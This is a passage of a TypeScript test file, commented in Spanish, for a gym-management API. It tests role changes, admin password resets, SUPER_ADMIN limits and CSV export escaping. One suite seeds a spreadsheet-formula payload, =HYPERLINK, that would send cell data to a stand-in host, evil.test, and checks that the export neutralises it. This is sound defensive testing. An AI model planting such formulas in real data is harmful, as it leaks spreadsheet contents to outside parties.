    createdUserIds.push(secondAdmin.id)

    const res = await app.inject({
      method: 'PUT',
      url: `/api/users/${secondAdmin.id}`,
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: { role: 'COACH' },
    })
    expect(res.statusCode).toBe(200)
    expect(res.json().role).toBe('COACH')
  })
})

// ─── Suite 6: POST /users/:id/reset-password ─────────────────────────────────

describe('Users: POST /api/users/:id/reset-password — reset de contraseña por admin', () => {
  let app: FastifyInstance
  let targetUserId: string

  beforeAll(async () => {
    app = await buildApp()
    const passwordHash = await bcrypt.hash(TEST_PASSWORD, 10)
    const user = await prisma.user.create({
      data: {
        gymId: gymAId,
        name: 'Usuario Para Reset',
        email: 'qa-users-reset-pw@test.local',
        passwordHash,
        role: 'MEMBER',
        mustChangePassword: false,
      },
    })
    targetUserId = user.id
    createdUserIds.push(targetUserId)
  })

  afterAll(async () => { await app.close() })

  it('sin token → 401', async () => {
    const res = await app.inject({
      method: 'POST',
      url: `/api/users/${targetUserId}/reset-password`,
      payload: { newPassword: 'newpass123' },
    })
    expect(res.statusCode).toBe(401)
  })

  it('MEMBER intenta resetear contraseña → 403', async () => {
    const res = await app.inject({
      method: 'POST',
      url: `/api/users/${targetUserId}/reset-password`,
      headers: { authorization: `Bearer ${memberAToken}` },
      payload: { newPassword: 'newpass123' },
    })
    expect(res.statusCode).toBe(403)
  })

  it('password nueva muy corta (menos de 6 caracteres) → 400', async () => {
    const res = await app.inject({
      method: 'POST',
      url: `/api/users/${targetUserId}/reset-password`,
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: { newPassword: '123' },
    })
    expect(res.statusCode).toBe(400)
    expect(res.json().error).toMatch(/al menos 6 caracteres/i)
  })

  it('sin campo newPassword → 400', async () => {
    const res = await app.inject({
      method: 'POST',
      url: `/api/users/${targetUserId}/reset-password`,
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: {},
    })
    expect(res.statusCode).toBe(400)
    expect(res.json().error).toMatch(/al menos 6 caracteres/i)
  })

  it('admin resetea contraseña de usuario de otro gym → 404', async () => {
    const res = await app.inject({
      method: 'POST',
      url: `/api/users/${memberBId}/reset-password`,
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: { newPassword: 'newpass123' },
    })
    expect(res.statusCode).toBe(404)
    expect(res.json().error).toMatch(/no encontrado/i)
  })

  it('admin resetea contraseña correctamente → 200 + mustChangePassword=true', async () => {
    const res = await app.inject({
      method: 'POST',
      url: `/api/users/${targetUserId}/reset-password`,
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: { newPassword: 'newpassword456' },
    })
    expect(res.statusCode).toBe(200)
    expect(res.json().ok).toBe(true)

    // Verificar en DB que mustChangePassword quedó en true
    const user = await prisma.user.findUnique({ where: { id: targetUserId } })
    expect(user!.mustChangePassword).toBe(true)
  })

  it('la nueva contraseña es válida para login (hash correcto)', async () => {
    const user = await prisma.user.findUnique({ where: { id: targetUserId }, omit: { passwordHash: false } })
    const valid = await bcrypt.compare('newpassword456', user!.passwordHash)
    expect(valid).toBe(true)
  })

  it('usuario inexistente → 404', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/users/00000000-0000-0000-0000-000000000000/reset-password',
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: { newPassword: 'newpass123' },
    })
    expect(res.statusCode).toBe(404)
  })
})

// ─── Suite 7: Permisos — SUPER_ADMIN puede administrar cualquier gym ──────────

describe('Users: SUPER_ADMIN tiene acceso completo', () => {
  let app: FastifyInstance
  let superAdminToken: string

  beforeAll(async () => {
    app = await buildApp()
    // SUPER_ADMIN no tiene gymId en el JWT (gymId: null)
    const tempApp = Fastify({ logger: false })
    await tempApp.register(jwt, { secret: JWT_SECRET })
    await tempApp.ready()
    superAdminToken = tempApp.jwt.sign({ userId: 'superadmin-id', gymId: null, email: 'superadmin@test.local', role: 'SUPER_ADMIN', name: 'Super Admin' })
    await tempApp.close()
  })

  afterAll(async () => { await app.close() })

  it('SUPER_ADMIN sin gymId no puede crear usuario (bloqueado en requireAdmin, no llega al service)', async () => {
    // SUPER_ADMIN tiene gymId: null → requireAdmin lo bloquea antes de llegar al service,
    // porque /api/users no está en el allowlist de rutas /superadmin/*.
    // Ver CLAUDE.md § SUPER_ADMIN: "con gymId: null solo puede acceder a rutas /superadmin/*".
    const res = await app.inject({
      method: 'POST',
      url: '/api/users',
      headers: { authorization: `Bearer ${superAdminToken}` },
      payload: {
        name: 'Test SUPER_ADMIN',
        email: 'qa-users-superadmin-test@test.local',
      },
    })
    expect(res.statusCode).toBe(403)
    expect(res.json().error).toMatch(/debe seleccionar un gimnasio/i)
  })
})

// ─── Suite 9: GET /users/export — CSV injection ──────────────────────────────

describe('Users: GET /api/users/export — previene CSV injection', () => {
  let app: FastifyInstance
  let formulaUserId: string

  beforeAll(async () => {
    app = await buildApp()
    const passwordHash = await bcrypt.hash(TEST_PASSWORD, 10)
    // Nombre que, sin escapar, Excel/Sheets interpretaría como fórmula al abrir el CSV
    const formulaUser = await prisma.user.create({
      data: {
        gymId: gymAId,
        name: '=HYPERLINK("http://evil.test?x="&A1,"click")',
        email: 'qa-users-formula-a@test.local',
        passwordHash,
        role: 'MEMBER',
      },
    })
    formulaUserId = formulaUser.id
    createdUserIds.push(formulaUserId)
  })

  afterAll(async () => { await app.close() })

  it('COACH no puede exportar (solo ADMIN) → 403', async () => {
    const res = await app.inject({
      method: 'GET',
      url: '/api/users/export?format=csv&role=MEMBER',
      headers: { authorization: `Bearer ${coachAToken}` },
    })
    expect(res.statusCode).toBe(403)
  })

  it('antepone comilla simple a un nombre que empieza con "="', async () => {
    const res = await app.inject({
      method: 'GET',
      url: '/api/users/export?format=csv&role=MEMBER',
      headers: { authorization: `Bearer ${adminAToken}` },
    })
    expect(res.statusCode).toBe(200)
    const csv = res.body
    // Escapado correcto: comilla simple antepuesta, luego la celda citada con "" internas
    expect(csv).toContain('"\'=HYPERLINK(""http://evil.test?x=""&A1,""click"")"')
    // Nunca debe aparecer la celda citada SIN el ' antepuesto (la forma vulnerable)
    expect(csv).not.toContain('"=HYPERLINK')
  })
})
